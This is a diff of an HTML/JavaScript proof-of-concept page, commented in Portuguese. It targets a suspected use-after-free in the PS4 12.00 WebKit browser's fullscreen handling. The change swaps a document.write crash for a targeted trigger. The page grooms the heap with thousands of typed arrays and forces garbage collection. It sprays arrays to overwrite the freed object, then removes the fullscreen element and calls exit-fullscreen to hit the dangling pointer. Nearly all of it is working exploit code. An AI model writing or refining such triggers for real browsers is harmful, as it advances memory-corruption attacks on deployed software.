@@ -2,13 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF Confirmation - Force GC Isolado</title>
+<title>PS4 UAF - Gatilho Cirúrgico</title>
 </head>
-<body>
+<body style="background-color: #222; color: #fff;">
 
-<h2>PS4 12.00 - UAF Confirmation (Teste 2 Isolado)</h2>
+<h2>PS4 12.00 - UAF Confirmation (Teste Cirúrgico do Fullscreen)</h2>
 
-<button onclick="runTest()">Executar Teste: Force GC</button>
+<button onclick="runTest()" style="padding: 10px; font-size: 16px;">Executar Teste: Destruição do Alvo</button>
 
 <div id="log"></div>
 
@@ -21,15 +21,30 @@ function runTest() {
 
     let controllers = [];
 
-    // Passo 1
+    // Passo 1: Alocação (Heap Grooming)
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // Fullscreen
-    document.documentElement.webkitRequestFullscreen?.();
+    // PASSO NOVO: Criamos o alvo do Fullscreen em vez de usar o documentElement
+    let fsTarget = document.createElement("div");
+    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Tela Cheia Ativa<br>Pressione OPTIONS agora</h1>";
+    fsTarget.style.backgroundColor = "black";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
+    document.body.appendChild(fsTarget);
+
+    // Entra em Fullscreen usando o nosso alvo específico
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
+    }
 
     window.onblur = function() {
         // FORÇA GC
@@ -39,7 +54,7 @@ function runTest() {
             new ArrayBuffer(0x10000);
         }
 
-        // Spray mantido
+        // Spray mantido (Essencial para sobrescrever o objeto C++ deletado)
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
@@ -47,11 +62,23 @@ function runTest() {
             spray.push(p);
         }
 
-        // Gatilho crítico
+        // Gatilho crítico Cirúrgico
         setTimeout(() => {
-            document.open();
-            document.write("<h1>Crash</h1>");
-            document.close();
+            try {
+                // 1. Destruímos apenas o elemento hospedeiro da tela cheia!
+                // Isso cria o "dangling pointer" no Fullscreen Manager do WebCore.
+                fsTarget.remove(); 
+                
+                // 2. Forçamos o WebKit a tentar resolver a saída da tela cheia agora que o elemento sumiu.
+                // Aqui é onde o WebKit deve tropeçar no seu PATTERN e crashar.
+                if (document.webkitIsFullScreen || document.fullscreenElement) {
+                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                }
+            } catch(e) {
+                console.log("[ERRO NO GATILHO]", e);
+            }
+
+            // O fallback caso sobreviva (não deve chegar aqui se o UAF funcionar)
             setTimeout(() => location.reload(), 500);
         }, 3000);
     };
